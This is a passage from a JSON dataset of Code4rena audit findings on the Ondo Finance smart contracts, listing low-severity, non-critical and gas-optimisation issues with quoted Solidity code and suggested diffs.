sweepToken()\ncontracts/lending/tokens/cToken/CErc20.sol - function _delegateCompLikeTo()\ncontracts/lending/tokens/cCash/CTokenCash.sol - function initialize()\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23526",
      "title": "[R-01] Shorthand way to write if / else statement",
      "impact": "LOW",
      "content": "The normal if / else statement can be refactored in a shorthand way to write it:\n1. Increases readability\n5. Shortens the overall SLOC.\n\n```solidity\ncontracts/lending/OndoPriceOracle.sol \n\n61: function getUnderlyingPrice(\n62:    address fToken\n63:  ) external view override returns (uint256) {\n64:    if (fTokenToUnderlyingPrice[fToken] != 0) {\n65:      return fTokenToUnderlyingPrice[fToken];\n66:    } else {\n67:      // Price is not manually set, attempt to retrieve price from Compound's\n68:      // oracle\n69:      address cTokenAddress = fTokenToCToken[fToken];\n70:      return cTokenOracle.getUnderlyingPrice(cTokenAddress);\n71:    }\n72:  } \n```\nThe above instance can be refactored in:\n\n```solidity\n61: function getUnderlyingPrice(\n62:    address fToken\n63:  ) external view override returns (uint256) {\n64:     address cTokenAddress = fTokenToCToken[fToken];\n65:    return fTokenToUnderlyingPrice[fToken] != 0 ? fTokenToUnderlyingPrice[fToken] : cTokenOracle.getUnderlyingPrice(cTokenAddress)\n66:  }\n```\nOther instances:\n```solidity\ncontracts/lending/tokens/cCash/CTokenCash.sol - function exchangeRateStoredInternal()\ncontracts/lending/tokens/cToken/CTokenModified.sol - function exchangeRateStoredInternal()\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23525",
      "title": "[N-14] Unnecessary KYC check on the payer",
      "impact": "LOW",
      "content": "The main use of the function `repayBorrowBehalf` is that a user can pay back a loan on behalf of the borrower.<br>\nThe problem here is that the function `repayBorrowFresh` checks if both the payer and the borrower are KYCed.<br>\nIn my opinion the check for the payer is unnecessary and shouldn't be restricted like that.<br>\nAs long as the borrower is KYCed, everything should be fine.\n\n```solidity\ncontracts/lending/tokens/cCash/CCash.sol\n\n121:  function repayBorrowBehalf(\n122:    address borrower,\n123:    uint repayAmount\n124:  ) external override returns (uint) {\n125:   repayBorrowBehalfInternal(borrower, repayAmount);\n126:    return NO_ERROR;\n127:  }\n\ncontracts/lending/tokens/cCash/CTokenCash.sol\n\n767:  function repayBorrowFresh(\n768:    address payer,\n769:    address borrower,\n770:    uint repayAmount\n771:  ) internal returns (uint) {\n772:    /* Revert if not KYC'd */\n773:    require(_getKYCStatus(payer), \"Payer not KYC'd\");\n774:    require(_getKYCStatus(borrower), \"Borrower not KYC'd\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23524",
      "title": "[N-13] NatSpec is incomplete in the pausing functions",
      "impact": "LOW",
      "content": "In the both pause and unpause functions a comment is made, that the purpose of this functions is to pause or unpause the minting functionality. This NatSpec isn't full as it not only applies on the minting, but on the redeeming as well.\n\n```solidity\ncontracts/cash/CashManager.sol\n\n522:  /**\n523:   * @notice Will pause minting functionality of this contract\n524:   *\n525:   */\n526:  function pause() external onlyRole(PAUSER_ADMIN) {\n527:    _pause();\n528:  }\n\n530:  /**\n531:   * @notice Will unpause minting functionality of this contract\n532:   */\n533:  function unpause() external onlyRole(MANAGER_ADMIN) {\n534:    _unpause();\n535:  }\n\n662:  function requestRedemption(\n663:    uint256 amountCashToRedeem\n664:  )\n665:    external\n666:    override\n667:    updateEpoch\n668:    nonReentrant\n669:    whenNotPaused\n670:    checkKYC(msg.sender)\n671:  {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23523",
      "title": "[N-12] Unused constructor",
      "impact": "LOW",
      "content": "The constructor does nothing.\n\n```solidity\ncontracts/lending/tokens/cCash/CCashDelegate.sol\n\n15: constructor() {}\n\ncontracts/lending/tokens/cToken/CTokenDelegate.sol\n\n15: constructor() {}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23522",
      "title": "[N-11] Two KYC checks made on the same redeemers",
      "impact": "LOW",
      "content": "The function `completeRedemptions` allows an admin account distribute collateral to users.<br>\nA check is made to ensure all of the redeemers are KYCed, but this check is unnecessary.<br>\nAs in order to request redemption with the function `requestRedemption`, the function already check if the user calling the function is KYCed.\n\n```solidity\ncontracts/cash/CashManager.sol\n\n662:  function requestRedemption(\n663:    uint256 amountCashToRedeem\n664:  )\n665:    external\n666:    override\n667:    updateEpoch\n668:    nonReentrant\n669:    whenNotPaused\n670:    checkKYC(msg.sender)\n\n707:  function completeRedemptions(\n708:    address[] calldata redeemers,\n709:    address[] calldata refundees,\n710:    uint256 collateralAmountToDist,\n711:    uint256 epochToService,\n712:    uint256 fees\n713:  ) external override updateEpoch onlyRole(MANAGER_ADMIN) {\n714:    _checkAddressesKYC(redeemers);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23521",
      "title": "[N-10] Pause/Unpause functions should emit event to notify users",
      "impact": "LOW",
      "content": "The two function are used to pause and unpause the contract. Consider emitting an even to notify the users, when this is happening.\n\n```solidity\ncontracts/cash/CashManager.sol\n\n526:  function pause() external onlyRole(PAUSER_ADMIN) {\n527:    _pause();\n528:   }\n\n533:  function unpause() external onlyRole(MANAGER_ADMIN) {\n534:    _unpause();\n535:  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23520",
      "title": "[N-09] Unnecessary if statement in `_checkAndUpdateRedeemLimit`",
      "impact": "LOW",
      "content": "In the private function `_checkAndUpdateRedeemLimit` an if statement occurs, which is triggered if the inputed amount is zero.\nThis if statement is unnecessary and useless as there is a check already made in the core function `requestRedemption` to ensure the requested redemption isn't below the `minimumRedeemAmount`.\n\n```solidity\ncontracts/cash/CashManager.sol\n\n641:  function _checkAndUpdateRedeemLimit(uint256 amount) private {\n642:    if (amount == 0) {\n643:      revert RedeemAmountCannotBeZero();\n644:    }\n645:    if (amount > redeemLimit - currentRedeemAmount) {\n646:      revert RedeemExceedsRateLimit();\n647:    }\n648:\n649:    currentRedeemAmount += amount;\n650:  }\n\n662:  function requestRedemption(\n663:    uint256 amountCashToRedeem\n664:  )\n665:    external\n666:    override\n667:    updateEpoch\n668:    nonReentrant\n669:    whenNotPaused\n670:    checkKYC(msg.sender)\n671:  {\n672:    if (amountCashToRedeem < minimumRedeemAmount) {\n673:      revert WithdrawRequestAmountTooSmall();\n674:    }\n675:\n676:    _checkAndUpdateRedeemLimit(amountCashToRedeem);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23519",
      "title": "[N-08] Confusing function comment on `setMinimumDepositAmount`",
      "impact": "LOW",
      "content": "There is a little confusion between the dev comment and the if statement in the function.<br>\nAs per dev comment the inputed `_minimumDepositAmount` should be larger than the `BPS_DENOMINATOR`.<br>\nBut the if statement actually allows for the ``_minimumDepositAmount` to equal the `BPS_DENOMINATOR`.\n\n```solidity\ncontracts/cash/CashManager.sol\n\n427: // @dev Must be larger than BPS_DENOMINATOR due to keep our `_getMintFees`\n\n433:  function setMinimumDepositAmount(\n434:    uint256 _minimumDepositAmount\n435:  ) external override onlyRole(MANAGER_ADMIN) {\n436:    if (_minimumDepositAmount < BPS_DENOMINATOR) {\n437:      revert MinimumDepositAmountTooSmall();\n438:    }\n439:    uint256 oldMinimumDepositAmount = minimumDepositAmount;\n440:    minimumDepositAmount = _minimumDepositAmount;\n441:    emit MinimumDepositAmountSet(\n442:      oldMinimumDepositAmount,\n443:      _minimumDepositAmount\n444:    );\n445:  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23518",
      "title": "[N-07] Use delete to clear variables instead of zero assignment",
      "impact": "LOW",
      "content": "You can use the delete keyword instead of setting the variable as zero.\n\n```solidity\ncontracts/cash/CashManager.sol\n\n259: mintRequestsPerEpoch[epochToClaim][user] = 0\n790: redemptionInfoPerEpoch[epochToService].addressToBurnAmt[refundee] = 0\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23517",
      "title": "[N-06] Initialize function does not use the initializer modifier",
      "impact": "LOW",
      "content": "Without the modifier, the function may be called multiple times, overwriting prior initializations.\n\n```solidity\ncontracts/lending/tokens/cCash/CCash.sol\n\n30: function initialize\n\ncontracts/lending/tokens/cToken/CErc20.sol\n\n30: function initialize\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23516",
      "title": "[N-05] Create your own import names instead of using the regular ones",
      "impact": "LOW",
      "content": "For better readability, you should name the imports instead of using the regular ones.\n\nExample:\n```solidity\nimport {IKYCRegistry} from \"contracts/cash/interfaces/IKYCRegistry.sol\";\n```\n\nInstances - All of the contracts.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23515",
      "title": "[N-04] Upgradeable contract is missing a `__gap[50]` storage variable",
      "impact": "LOW",
      "content": "Reference: [Storage_gaps](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps)\n\nYou may notice that every contract includes a state variable named `__gap`. This is empty reserved space in storage that is put in place in Upgradeable contracts. It allows us to freely add new state variables in the future without compromising the storage compatibility with existing deployments.\n\nInstances:\n```solidity\ncontracts/cash/token/CashKYCSender.sol\n\n22:  contract CashKYCSender is\n23:  ERC20PresetMinterPauserUpgradeable,\n24:  KYCRegistryClientInitializable\n```\n```solidity\ncontracts/cash/token/Cash.sol\n\n21: contract Cash is ERC20PresetMinterPauserUpgradeable \n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23514",
      "title": "[N-03] Missing check to ensure epoch duration isn't set as zero",
      "impact": "LOW",
      "content": "The function `setEpochDuration` is used to change the epoch duration. Considering the fact that setting an epoch's duration as 0 seconds might lead to undesired behaviour behavior. Adding a simple check to prevent this from happening is recommended.\n\n```solidity\ncontracts/cash/CashManager.sol\n\n546:  function setEpochDuration(\n547:    uint256 _epochDuration\n548:  ) external onlyRole(MANAGER_ADMIN) {\n549:    uint256 oldEpochDuration = epochDuration;\n550:    epochDuration = _epochDuration;\n551:    emit EpochDurationSet(oldEpochDuration, _epochDuration);\n552:  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23513",
      "title": "[N-02] Constructor lacks address(0) check",
      "impact": "LOW",
      "content": "Zero-address check should be used in the constructors, to avoid the risk of setting smth as address(0) at deploying time.\n\nInstances:\n```solidity\ncontracts/cash/factory/CashFactory.sol\n\n53: constructor(address _guardian) {\n\ncontracts/cash/factory/CashKYCSenderFactory.sol\n\n53: constructor(address _guardian) {\n\ncontracts/cash/factory/CashKYCSenderReceiverFactory.sol\n\n53: constructor(address _guardian) {\n\ncontracts/lending/JumpRateModelV2.sol\n\n59: constructor() - owner\n\ncontracts/cash/kyc/KYCRegistry.sol\n\n51: constructor() - admin\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23512",
      "title": "[N-01] Mandatory checks for extra safety",
      "impact": "LOW",
      "content": "In the following functions below, there are some checks that can be made in order to achieve more safe and efficient code.\n\n1. In the function `setPrice` a require statement can be made to check if the new price is non-zero.\n\n```solidity\ncontracts/lending/OndoPriceOracle.sol\n\n80:  function setPrice(address fToken, uint256 price) external override onlyOwner {\n81:    uint256 oldPrice = fTokenToUnderlyingPrice[fToken];\n82:    fTokenToUnderlyingPrice[fToken] = price;\n83:    emit UnderlyingPriceSet(fToken, oldPrice, price);\n84:  }\n```\n\n2. In the function `setFTokenToCToken` a require statement can be made to check if the inputed addresses aren't the same.\n\n```solidity\ncontracts/lending/OndoPriceOracle.sol\n\n92:  function setFTokenToCToken(\n93:    address fToken,\n94:    address cToken\n95:  ) external override onlyOwner {\n96:    address oldCToken = fTokenToCToken[fToken];\n97:    _setFTokenToCToken(fToken, cToken);\n98:    emit FTokenToCTokenSet(fToken, oldCToken, cToken);\n99:  }\n```\n\n3.  In the function `setOracle` a check can be made to ensure the newOracle isn't set as address(0).\n\n```solidity\ncontracts/lending/OndoPriceOracle.sol\n\n106:  function setOracle(address newOracle) external override onlyOwner {\n107:    address oldOracle = address(cTokenOracle);\n108:    cTokenOracle = CTokenOracle(newOracle);\n109:    emit CTokenOracleSet(oldOracle, newOracle);\n110:  }\n```\nOther instances in:\n```solidity\ncontracts/lending/OndoPriceOracleV2.sol\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "6439",
      "title": "[G-18] Use a more recent version of solidity",
      "impact": "GAS",
      "content": "\nUse a solidity version of at least 0.8 to get default underflow/overflow checks, use a solidity version of at least 0.8.2 to get simple compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than revert()/require() strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value.\n\nWe can avoid using the library safeMath in the following file by using version 0.8+\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/JumpRateModelV2.sol#L1\n```solidity\nFile: /contracts/lending/JumpRateModelV2.sol\n1:pragma solidity ^0.5.16;\n```\n\n**[ypatil12 (Ondo Finance) commented](https://github.com/code-423n4/2023-01-ondo-findings/issues/198#issuecomment-1402197354):**\n > Amazing report.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-18-use-a-more-recent-version-of-solidity",
      "tags": [],
      "finders": []
    },
    {
      "id": "6438",
      "title": "[G-17] Caching global variables is more expensive than using the actual variable(use msg.sender instead of caching it)",
      "impact": "GAS",
      "content": "\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenCash.sol#L182-L190<br>\nIt's cheaper to use msg.sender as compared to caching \n```solidity\nFile: /contracts/lending/tokens/cCash/CTokenCash.sol\n182:  function approve(\n183:    address spender,\n184:    uint256 amount\n185:  ) external override returns (bool) {\n186:    address src = msg.sender;\n187:    transferAllowances[src][spender] = amount;\n188:    emit Approval(src, spender, amount);\n189:    return true;\n190:  }\n```\n\n```diff\ndiff --git a/contracts/lending/tokens/cCash/CTokenCash.sol b/contracts/lending/tokens/cCash/CTokenCash.sol\nindex 93d5000..2dbaadd 100644\n--- a/contracts/lending/tokens/cCash/CTokenCash.sol\n+++ b/contracts/lending/tokens/cCash/CTokenCash.sol\n@@ -183,9 +183,8 @@ abstract contract CTokenCash is\n     address spender,\n     uint256 amount\n   ) external override returns (bool) {\n-    address src = msg.sender;\n-    transferAllowances[src][spender] = amount;\n-    emit Approval(src, spender, amount);\n+    transferAllowances[msg.sender][spender] = amount;\n+    emit Approval(msg.sender, spender, amount);\n     return true;\n   }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-17-caching-global-variables-is-more-expensive-than-using-the-actual-variableuse-msgsender-instead-of-caching-it",
      "tags": [],
      "finders": []
    },
    {
      "id": "6437",
      "title": "[G-16] Reorder the require statements to have the less gas consuming before the expensive one",
      "impact": "GAS",
      "content": "https://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/kyc/KYCRegistry.sol#L79-L112<br>\n**Save 225 gas on average**\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 752    | 23892   | 34436 | 41128 |\n| After  | 690    | 23667   | 34436 | 41128 |\n\n```solidity\nFile: /contracts/cash/kyc/KYCRegistry.sol\n79: function addKYCAddressViaSignature(\n80:    uint256 kycRequirementGroup,\n81:    address user,\n82:    uint256 deadline,\n83:    uint8 v,\n84:    bytes32 r,\n85:    bytes32 s\n86:  ) external {\n87:    require(v == 27 || v == 28, \"KYCRegistry: invalid v value in signature\");\n88:    require(\n89:      !kycState[kycRequirementGroup][user],\n90:      \"KYCRegistry: user already verified\"\n91:    );\n92:    require(block.timestamp <= deadline, \"KYCRegistry: signature expired\");\n```\n\nIts cheaper to check for `block.timestamp <= deadline` as compared to `!kycState\\[kycRequirementGroup]\\[user]` as this involves reading the storage variable. Therefore if the `require(block.timestamp <= deadline, \"KYCRegistry: signature expired\");` fails it would be cheaper to fail before evaluating the `!kycState\\[kycRequirementGroup]\\[user]`\n\n\n```diff\ndiff --git a/contracts/cash/kyc/KYCRegistry.sol b/contracts/cash/kyc/KYCRegistry.sol\nindex 896c727..d5401df 100644\n--- a/contracts/cash/kyc/KYCRegistry.sol\n+++ b/contracts/cash/kyc/KYCRegistry.sol\n@@ -85,11 +85,12 @@ contract KYCRegistry is AccessControlEnumerable, IKYCRegistry, EIP712 {\n     bytes32 s\n   ) external {\n     require(v == 27 || v == 28, \"KYCRegistry: invalid v value in signature\");\n+    require(block.timestamp <= deadline, \"KYCRegistry: signature expired\");\n+\n     require(\n       !kycState[kycRequirementGroup][user],\n       \"KYCRegistry: user already verified\"\n     );\n-    require(block.timestamp <= deadline, \"KYCRegistry: signature expired\");\n     bytes32 structHash = keccak256(\n       abi.encode(_APPROVAL_TYPEHASH, kycRequirementGroup, user, deadline)\n     );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-16-reorder-the-require-statements-to-have-the-less-gas-consuming-before-the-expensive-one",
      "tags": [],
      "finders": []
    },
    {
      "id": "6436",
      "title": "[G-15] Splitting require() statements that use && saves gas - (saves 8 gas per &&)",
      "impact": "GAS",
      "content": "\nInstead of using the && operator in a single require statement to check multiple conditions,using multiple require statements with 1 condition per require statement will save 8 GAS per `&&`.<br>\nThe gas difference would only be realized if the revert condition is realized(met).\n\n### Proof of Concept\n**The following tests were carried out in remix with both optimization turned on and off**\n\n```solidity\nfunction multiple (uint a) public pure returns (uint){\n\trequire ( a > 1 && a < 5, \"Initialized\");\n\treturn  a + 2;\n}\n```\n**Execution cost**<br>\n21617 with optimization and using `&&`<br>\n21976 without optimization and using `&&`<br>\n\nAfter splitting the require statement\n```solidity\nfunction multiple(uint a) public pure returns (uint){\n\trequire (a > 1 ,\"Initialized\");\n\trequire (a < 5 , \"Initialized\");\n\treturn a + 2;\n}\n```\n**Execution cost**<br>\n21609 with optimization and split require<br>\n21968 without optimization and using split require<br>\n\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/OndoPriceOracleV2.sol#L292-L296\n```solidity\nFile: /contracts/lending/OndoPriceOracleV2.sol\n292:    require(\n293:      (answeredInRound >= roundId) &&\n294:        (updatedAt >= block.timestamp - maxChainlinkOracleTimeDelay),\n295:      \"Chainlink oracle price is stale\"\n296:    );\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenCash.sol#L45-L48\n```solidity\nFile: /contracts/lending/tokens/cCash/CTokenCash.sol\n45:    require(\n46:      accrualBlockNumber == 0 && borrowIndex == 0,\n47:      \"market may only be initialized once\"\n48:    );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-15-splitting-require-statements-that-use--saves-gas---saves-8-gas-per-",
      "tags": [],
      "finders": []
    },
    {
      "id": "6435",
      "title": "[G-14] Using unchecked blocks to save gas - Increments in for loop can be unchecked  ( save 30-40 gas per loop iteration)",
      "impact": "GAS",
      "content": "The majority of Solidity for loops increment a uint256 variable that starts at 0. These increment operations never need to be checked for over/underflow because the variable will never reach the max number of uint256 (will run out of gas long before that happens). The default over/underflow check wastes gas in every iteration of virtually every for loop . eg.\n\ne.g Let's work with a sample loop below.\n\n```solidity\nfor(uint256 i; i < 10; i++){\n//doSomething\n}\n\n```\ncan be written as shown below.\n```solidity\nfor(uint256 i; i < 10;) {\n  // loop logic\n  unchecked { i++; }\n}\n```\n\nWe can also write  it as an inlined function like below.\n\n```solidity\nfunction inc(i) internal pure returns (uint256) {\n  unchecked { return i + 1; }\n}\nfor(uint256 i; i < 10; i = inc(i)) {\n  // doSomething\n}\n```\n\n**Affected code**<br>\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/factory/CashFactory.sol#L127-L133\n```solidity\nFile: /contracts/cash/factory/CashFactory.sol\n127:    for (uint256 i = 0; i < exCallData.length; ++i) {\n128:      (bool success, bytes memory ret) = address(exCallData[i].target).call{\n129:        value: exCallData[i].value\n130:      }(exCallData[i].data);\n131:      require(success, \"Call Failed\");\n132:      results[i] = ret;\n133:    }\n```\nThe above should be modified to:\n\n```diff\ndiff --git a/contracts/cash/factory/CashFactory.sol b/contracts/cash/factory/CashFactory.sol\nindex 24b67ba..84bb244 100644\n--- a/contracts/cash/factory/CashFactory.sol\n+++ b/contracts/cash/factory/CashFactory.sol\n@@ -124,12 +124,15 @@ contract CashFactory is IMulticall {\n     ExCallData[] calldata exCallData\n   ) external payable override onlyGuardian returns (bytes[] memory results) {\n     results = new bytes[](exCallData.length);\n-    for (uint256 i = 0; i < exCallData.length; ++i) {\n+    for (uint256 i = 0; i < exCallData.length;) {\n       (bool success, bytes memory ret) = address(exCallData[i].target).call{\n         value: exCallData[i].value\n       }(exCallData[i].data);\n       require(success, \"Call Failed\");\n       results[i] = ret;\n+      unchecked {\n+        ++i;\n+      }\n     }\n   }\n```\n\n**Other Instances to modify**\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/factory/CashKYCSenderFactory.sol#L137\n```solidity\nFile: /contracts/cash/factory/CashKYCSenderFactory.sol\n137:    for (uint256 i = 0; i < exCallData.length; ++i) {\n```\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/factory/CashKYCSenderReceiverFactory.sol#L137\n```solidity\nFile: /contracts/cash/factory/CashKYCSenderReceiverFactory.sol\n137:    for (uint256 i = 0; i < exCallData.length; ++i) {\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/kyc/KYCRegistry.sol#L163\n```solidity\nFile: /contracts/cash/kyc/KYCRegistry.sol\n163:    for (uint256 i = 0; i < length; i++) {\n\n180:    for (uint256 i = 0; i < length; i++) {\n\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/CashManager.sol#L750\n```solidity\nFile: /contracts/cash/CashManager.sol\n750:    for (uint256 i = 0; i < size; ++i) {\n\n786:    for (uint256 i = 0; i < size; ++i) {\n\n933:    for (uint256 i = 0; i < size; ++i) {\n\n961:    for (uint256 i = 0; i < exCallData.length; ++i) {\n```\n[see resource](https://github.com/ethereum/solidity/issues/10695)\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-14-using-unchecked-blocks-to-save-gas---increments-in-for-loop-can-be-unchecked---save-30-40-gas-per-loop-iteration",
      "tags": [],
      "finders": []
    },
    {
      "id": "6434",
      "title": "[G-13] Using unchecked blocks to save gas",
      "impact": "GAS",
      "content": "Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isnâ€™t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block.<br>\n[see resource](https://github.com/ethereum/solidity/issues/10695)\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/CashManager.sol#L297\n```solidity\nFile: /contracts/cash/CashManager.sol\n297:      rateDifference = exchangeRate - lastSetMintExchangeRate;\n```\n\nThe operation `exchangeRate - lastSetMintExchangeRate` cannot underflow as it would only be evaluated if `exchangeRate` is greater than `lastSetMintExchangeRate`\n\nWe can modify it as follows\n\n```diff\ndiff --git a/contracts/cash/CashManager.sol b/contracts/cash/CashManager.sol\nindex 4eb4203..a99cea7 100644\n--- a/contracts/cash/CashManager.sol\n+++ b/contracts/cash/CashManager.sol\n@@ -294,7 +294,10 @@ contract CashManager is\n\n     uint256 rateDifference;\n     if (exchangeRate > lastSetMintExchangeRate) {\n-      rateDifference = exchangeRate - lastSetMintExchangeRate;\n+      unchecked {\n+        rateDifference = exchangeRate - lastSetMintExchangeRate;\n+      }\n+\n     } \n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/CashManager.sol#L299\n```solidity\nFile: /contracts/cash/CashManager.sol\n299:      rateDifference = lastSetMintExchangeRate - exchangeRate;\n```\nThe operation `lastSetMintExchangeRate - exchangeRate` cannot underflow as it would only be evaluated if `lastSetMintExchangeRate` is greater than `exchangeRate`.\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/CashManager.sol#L865\n```solidity\nFile: /contracts/cash/CashManager.sol\n865:      redemptionInfoPerEpoch[epoch].totalBurned -= previousBalance - balance;\n```\nThe operation `previousBalance - balance` cannot underflow as it would only be evaluated if `previousBalance` is greater than `balance` due to the check on [Line 864](https://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/CashManager.sol#L864).\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/CashManager.sol#L865\n```solidity\nFile: /contracts/cash/CashManager.sol\n867:      redemptionInfoPerEpoch[epoch].totalBurned += balance - previousBalance;\n```\nThe operation `balance - previousBalance` cannot underflow as it would only be evaluated if `balance` is greater than `previousBalance` due to the check on [Line 